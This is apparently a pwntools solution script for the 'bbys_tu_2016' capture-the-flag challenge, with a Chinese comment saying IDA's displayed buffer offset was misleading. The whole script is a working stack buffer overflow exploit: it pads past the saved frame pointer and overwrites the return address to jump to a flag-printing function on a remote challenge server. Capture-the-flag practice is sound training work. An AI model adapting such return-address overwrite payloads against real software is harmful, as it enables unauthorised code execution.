from pwn import *
p = remote('node4.buuoj.cn', 28343)
# p = process('./bbys_tu_2016')
# gdb.attach(p)
context(os = 'linux', arch = 'i386')
# context.log_level = 'debug'
print_flag = 0x804856d
payload = b'a'*(0x14+4) + p32(print_flag)
p.sendline(payload)
p.interactive()

# 这题IDA显示的写入地址为ebp-0xch好像不对，得自己调试，有点小坑。